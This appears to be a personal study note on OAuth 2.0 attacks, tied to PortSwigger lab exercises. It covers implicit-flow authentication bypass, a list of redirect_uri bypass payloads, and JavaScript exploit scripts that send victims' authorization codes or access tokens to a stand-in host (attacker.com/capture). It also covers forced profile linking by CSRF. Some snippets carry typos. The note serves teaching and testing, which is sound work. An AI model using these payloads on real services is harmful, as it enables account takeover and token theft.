---
created: 2026-05-27
tags:
  - web_hacking
  - authentication
status: incomplete
---
## OAuth vulnerabilities

- The OAuth 2.0 specification, [`RFC 6749`](https://datatracker.ietf.org/doc/html/rfc6749), is relatively permissive and flexible by design. Most of the implementation is completely optional — except for a handful of parameters required for basic functionality of each grant type. This leaves a room for bad practices and misconfiguration, and is one of the main reasons why OAuth vulnerabilities occur.

>[!note] To learn more about how OAuth 2.0 works, see [[🛠️ OAuth]]. 

- OAuth 2.0 vulnerabilities can be divided into two main types:
	- **Client application vulnerabilities**
		- Incorrect implementation of what the protocol provides.  
	- **Authorization Server vulnerabilities**
		- Misconfiguration or implementation flaws in the OAuth service itself.


>[!note] Most of OAuth 2.0 attacks answer one question: *what happens when the client, or the authorization server, believes something that arrived via the browser without independently verifying it?*
## Recon methodology

### Walking the flow

- Walk through the SSO login and capture every request in Burp.
- Determine which OAuth provider is used; if the application doesn't explicitly name the provider (e.g., `Sign in with <provider>`), look at the parameters in an authorization request (the `Host` header).

```http
GET /authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https%3A%2F%2Fclient.example.com%2Foauth%2Fcallback&
  scope=read%3Aemail%20profile&
  state=CSRF_TOKEN
HTTP/1.1
Host: authorization-server.com
```

>[!note] The `Host` header of the `/authorize` request identifies the authorization server.

![[images/walkthrough/PortSwigger/OAuth/lab1/3.png]]

### Pull the discovery document

- Fetch authorization server documentation (if present):
	- OAuth 2.0 documentation: `/.well-known/oauth-authorization-server` ([`RFC 8414`](https://datatracker.ietf.org/doc/html/rfc8414));
	- OIDC (Open ID Connect) Discovery: `/.well-known/openid-configuration`.

```bash
curl -s https://authorization-server.com/.well-known/oauth-authorization-server | python3 -m json.tool
```

```bash
curl -s https://authorization-server.com/.well-known/openid-configuration | python3 -m json.tool
```

- These are JSON documents that specify which security feature the Authorization Server supports (or doesn't), including grant types, response types, and signing algorithms.

- Important fields to note:

| Field                                   | Description                                                                                                                                               |
| --------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `authorization_endpoint`                | Endpoint where users authenticate and authorize clients.                                                                                                  |
| `token_endpoint`                        | Endpoint where authorization codes are exchanged for tokens.                                                                                              |
| `registration_endpoint`                 | Supports Dynamic Client Registration ([`RFC 7591`](https://datatracker.ietf.org/doc/html/rfc7591)).                                                       |
| `response_types_supported`              | OAuth flows the Authorization Server supports (`code`, `token`, `id_token`, etc.).                                                                        |
| `request_uri_parameter_supported`       | Whether clients can provide a `request_uri` containing a signed authorization request.                                                                    |
| `id_token_signing_alg_values_supported` | Algorithms used to sign ID Tokens (e.g., `RS256`, `ES256`, etc.).                                                                                         |
| `subject_types_supported`               | Subject identifier types.<br>`pairwise` improves privacy by using different subject IDs per client. `public` exposes the same identifier to every client. |
| `token_endpoint_auth_methods_supported` | Client authentication methods accepted at the token endpoint.                                                                                             |
| `code_challenge_methods_supported`      | PKCE methods supported (`S256`, `plain`).                                                                                                                 |
| `jwks_uri`                              | Location of the JSON Web Key Set.                                                                                                                         |

>[!example]+ Example specifications
>- Okta:
>	- `https://okta.okta.com/.well-known/oauth-authorization-server`
>	- `https://okta.okta.com/.well-known/openid-configuration`
>

### Mapping the attack surface

- For every request, note:

| What to check                                                                                     | Why it matters                                                          |
| ------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| `response_type` value                                                                             | Determines the grant type in use.                                       |
| For `response_type=code`, presence of the `code_challenge` and `code_challenge_method` parameters | If present, PKCE is in use (Authorization Code Grant).                  |
| Presence of the `state` parameter                                                                 | Absent `state` -> test for CSRF.                                        |
| Whether `state` matches between the request and callback                                          | If not -> state is not validated `state` -> test for CSRF.              |
| `nonce` present (OIDC)                                                                            | Absent → test for `id_token` replay.                                    |
| The rxact `redirect_uri` string                                                                   | Baseline for bypass fuzzing.                                            |
| Requested `scope`                                                                                 | Baseline for scope-upgrade testing.                                     |
| How does the client complete authentication after the callback?                                   | `POST` body with access token = implicit flow -> test for token misuse. |

- Determine the grant type:
	- `response_type=code` without `code_challenge` -> Authorization Code Grant.
	- `response_type=code` with `code_challenge` -> Authorization Code + PKCE.
	- `response_type=token` -> Implicit Grant.
	- `grant_type=password` in token request -> ROPC. 
	- `grant_type=client_credentials` → Client Credentials.

## Attacks against the Implicit Grant

- The Implicit Grant was designed for public (non-confidential) clients that cannot securely store client secrets, such as Single-Page Applications (SPAs).
- Instead of returning an authorization code that the client later exchanges for an access token in a server-to-server request (keeping the token away from the user's browser), **the Authorization Server sends the access token directly to the browser in the URL fragment**, where front-end JavaScript extracts it:

```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback#access_token=ACCESS_TOKEN&token_type=bearer&expires_in=3600&state=CSRF_TOKEN
```

>[!note] For more about the Implicit Grant, see [[🛠️ OAuth#Implicit Grant (deprecated)]].

- Although the Implicit Grant was intended for public clients, **some confidential, server-backend applications still use this flow** (often because it's simpler to implement). 
- After receiving the access token, **the front-end JavaScript uses it to retrieve the user's information from the Resource Server** (such as from the `/userinfo` endpoint). It then forwards both the retrieved user data and the access token to its own backend, which creates a server-side session.

```http
POST /authenticate HTTP/1.1
Host: example.com
...

email=jane_doe@example.com
username=jane
access_token=ACCESS_TOKEN
```

- Ideally, the backend should use the access token to request the user's information directly from the Resource Server, and verify that it matches the data received in the request (or ignore user-supplied identity data completely).
- If the backend **only verifies that the access token is valid**, but **blindly trusts user-controlled parameters** such as `email` or `username` to create the session, **you can authenticate as any user by supplying your own valid access token together with the victim's identity**.

```http
POST /authenticate
Host: example.com

email=victim@example.com
username=victim
access_token=YOUR_ACCESS_TOKEN
```

>[!bug]+ Labs
>- [[🛠️ OAuth labs#1. Authentication bypass via OAuth implicit flow]]

## Account hijacking via redirect URI

- if the Authorization Server doesn't validate the `redirect_uri` parameter in the authorization request against a predefined whitelist (or the validation is flawed_, you can redirect the authorization server's response — code or token included — to a destination of your choosing. 

>[!note] The authorization server has no independent way to verify that the `redirect_uri` in a given request is legitimate other than comparing it against what the client registered up front. Any comparison logic looser than an exact string match creates room for a URI that satisfies the check but resolves somewhere the developer never intended.

- Before crafting an exploit, fuzz the `redirect_uri` parameter to learn the validation logic in play and see what the Authorization Server accepts:

| Example payload                                                                                            |
| ---------------------------------------------------------------------------------------------------------- |
| `https://attacker.com`                                                                                     |
| `https://client.example.com.attacker.com`                                                                  |
| `https://attacker.com/?client.example.com`                                                                 |
| `https://attacker.com/?d=client.example.com`                                                               |
| `http://client.example.com` (registered as `https`)                                                        |
| `https://attacker.com# client.example.com`                                                                 |
| `https://client.example.com%23attacker.com`                                                                |
| `https://client.example.com:@attacker.com`                                                                 |
| `redirect_uri=https://client.example.com/callback&redirect_uri=https://attacker.com` (parameter pollution) |

>[!note] See [`URL validation byass cheat sheet`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).

**Testing methodology:**

1. Establish a `redirect_uri` value the Authorization Server accepts but that resolves to a location you control.
2. Send a crafted authorization URL to a victim who has an active session with the authorization server:

```powershell
https://oauth-server.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https%3A%2F%2Fattacker.com%2Fcapture&
  scope=read%3Aemail%20profile&
```

3. Because the victim is already authenticated, no login prompt appears — the Authorization Server immediately issues a code (or token) and redirects to your endpoint:

```powershell
https://attacker.com/capture?code=STOLEN_CODE&state=...
```

4. Take the stolen value and complete the flow **against the legitimate client**, exactly as the victim's browser would have:

```powershell
https://client.example.com/oauth-callback?code=STOLEN_CODE
```

5. The client application completes the token exchange and logs *you* in as the victim. 

>[!bug]+ Labs
>- [[🛠️ OAuth labs#4. OAuth account hijacking via redirecturi]]


## Stealing codes and tokens via whitelisted pages

- Even if the authorization server properly verifies that the `redirect_uri` belongs to a **whitelisted domain**, OAuth secrets may still be exposed if that trusted domain contains a secondary vulnerability.
- So, even if you can're send the authorization code or access token directly to your own server, you may be able to redirect the victim to a vulnerable page on the trusted domain that ultimately leaks the secret to you.
- The exact technique depends on **where the OAuth secret is delivered**:
	- **Authorization Code Grant** — the authorization code is appended to the **query string** (`?code=...`), so you need a way to access or forward query parameters.
	- **Implicit Grant** — the access token is placed in the **URL fragment** (`#access_token=...`). Since fragments are never sent in HTTP requests, you need a vulnerability that can read or preserve the fragment on the client side.
- After determining how much control you have over the `redirect_uri` parameter, enumerate pages on the whitelisted domain for secondary vulnerabilities that could expose the OAuth secret.
### Secondary vulnerabilities on the whitelisted domain

- **Open redirect**
	- A page that performs a second redirect to your server.
	- This is sufficient to steal authorization codes and can sometimes also be used to preserve URL fragments across redirects.

- **Cross-site scripting (XSS)**
	- Reflected or stored XSS on a whitelisted page can read either the query string or `window.location.hash` and deliver it to your server.

>[!note] See [[XSS]].

- **HTML injection without JavaScript**
	- Even if JavaScript execution is blocked (e.g., by a restrictive [[CSP]]), HTML injection may still suffice. 
	- For example, injecting an `<img>` element that sources your domain (e.g., `<img src="https://attacker.com/image.png">`) may cause the victim's browser to leak the page URL in the `Referer` header — potentially exposing query parameters (and, depending on browser behavior and referrer policy, the fragment).
- **Unsafe JavaScript handling URL data**
	- Some pages read `window.location.hash` or URL parameters and then forward them elsewhere (for example through `postMessage`, `document.location`, or form submission). This can unintentionally expose OAuth secrets.
### Open redirect chain (worked example)

- Suppose the authorization server only verifies that `redirect_uri` begins with:

```powershell
https://client.example.com/oauth-callback
```

- The client application also contains an open redirect:

```powershell
/post/next?path=ARBITRARY_URL
```

1. Confirm the open redirect works independently:

```http
GET /post/next?path=https://attacker.com/check
```

2. Construct a `redirect_uri` that satisfies the prefix check but ultimately resolves to the open redirect:

```powershell
https://client.example.com/oauth-callback/../post/next?path=https://attacker.com/capture
```

- The authorization server validates the beginning of the URL (`https://client.example.com/oauth-callback`), but after path normalization the browser requests `/post/next?path=https://attacker.com/capture`, which redirects to your server.

3. Construct the exploit

- **Authorization Code Grant** — the authorization code is appended as a query parameter (`?code=...`). Because query parameters are preserved across HTTP redirects, the code is forwarded to your server, where it can be recovered from the access logs.

```html
<script>
	const params = new URLSearchParams(window.location.search);
	
	// no code parameter -> first visit; trigger the OAuth flow with redirect_uri pointing at this page
	if (!params.has("code")) { 
		window.location = 'https://oauth-server.com/authorize?' +
			'client_id=CLIENT_ID&' +
			'redirect_uri=https://client.example.com/oauth-callback/../post/next' +
			'?path=https://attacker.com/capture&' +
			'response_type=token&' +
			'nonce=abc123&' +
			'scope=openid+profile+email';
	}
	// code parameter present -> second redirect; the code is already captured in access log
</script>
```

- **Implicit Grant** — the access token is returned as a URL fragment (`#access_token=...`). Unlike query parameters, fragments are never transmitted in HTTP requests. However, browsers *generally* preserve the fragment when following redirects **unless the redirect target specifies its own fragment**. As a result, if the victim ultimately lands on a page you control, your JavaScript can read `window.location.hash` and exfiltrate the token.

```html
<script>

	// no hash -> first visit; trigger the OAuth flow with redirect_uri pointing at this page
	if (!document.location.hash) {
	
		// first visit: initiate the OAuth flow, point redirect_uri at this page
		window.location = 'https://oauth-server.example.com/authorize?' +
			'client_id=CLIENT_ID&' +
			'redirect_uri=https://client.example.com/oauth-callback/../post/next' +
			'?path=https://attacker.com/capture&' +
			'response_type=token&' +
			'nonce=abc123&' +
			'scope=openid+profile+email';

	} else {
		// hash present -> second redirect; the token is already captured in access log
		// to capture explicitly:
		window.location = '/capture?' + document.location.hash.substr(1);
	}
</script>
```

- An important fact that makes the previous exploit work:

>[!important] URL fragments (`#access_token=...`) are never sent to the server. However, browsers typically preserve them across redirects unless the new URL explicitly defines its own fragment.

4. Check your exploit server's access logs (or the capture endpoint) for the leaked authorization code or access token.

>[!important] Do not focus exclusively on `redirect_uri` — experiment with Other OAuth parameters and their combinations as well.

>[!bug]+ Labs
>- [[🛠️ OAuth labs#5. Stealing OAuth access tokens via an open redirect]]
## CSRF in the OAuth flow

>The **`state` parameter** is an opaque, cryptographically random value generated by the client before the authorization request is sent, stored server-side (or in the user's session), and echoed back unchanged by the authorization server in the callback.

- The `state` parameter binds the OAuth callback to the user's browser session that initiated the authorization request. Its primary purpose is to prevent [[CSRF]] attacks. 

>[!note] You can think of `state` as the OAuth 2.0 equivalent of a CSRF token.

- If the `state` parameter is missing or not validated on callback receipt, the client application can't verify that the callback corresponds to the authorization request initiated by the current user's session.
- As a result, you can **inject a callback from a different OAuth flow**. This can be exploited in CSRF attacks.

>[!note] See [[CSRF]].
### Forced OAuth profile linking

One of the most impactful ways to exploit missing or flawed `state` validation is **forced OAuth profile linking**.

1. Initiate an OAuth account-linking flow **using your own social media account**.
2. Intercept the callback request before it reaches the application (for example, `GET /oauth-callback?code=AUTHORIZATION_CODE`) and drop it. The authorization code must remain unused.
3. Send the intercepted callback URL to a logged-in victim and trick them into visiting it:

```html
<script>
	window.location="https://client.example.com/oaith-callback=code=AUTHORIZATION_CODE"
</script>
```

4. Because the application does not validate the `state` parameter, it accepts **your authorization code** in the victim's session context. As a result, the victim's application account becomes linked to **your** social media account.
5. You can now authenticate via OAuth using your social account and gain access to the victim's application account.
## References

- https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities
- https://infosecwriteups.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-and-mitigation-d01dd6d5fa2c
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Auth%20Misconfiguration#executing-xss-via-redirect---uri
- https://portswigger.net/web-security/oauth


- https://dev.to/hem/oauth-2-0-flows-explained-in-gifs-2o7a
- https://datatracker.ietf.org/doc/html/rfc6749
- https://infosecwriteups.com/oauth-2-0-hacking-simplified-part-1-understanding-basics-ad323cb4a05c
- https://auth0.com/docs/authenticate/protocols/oauth
- https://developer.okta.com/blog/2017/06/21/what-the-heck-is-oauth
- https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2


- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration#executing-xss-via-redirect---uri
- https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities


- https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses
- https://careers.coupa.com/how-to-identify-oauth2-vulnerabilities-and-mitigate-risks

- TODO: 
	- OIDC attacks (but that's for another guide)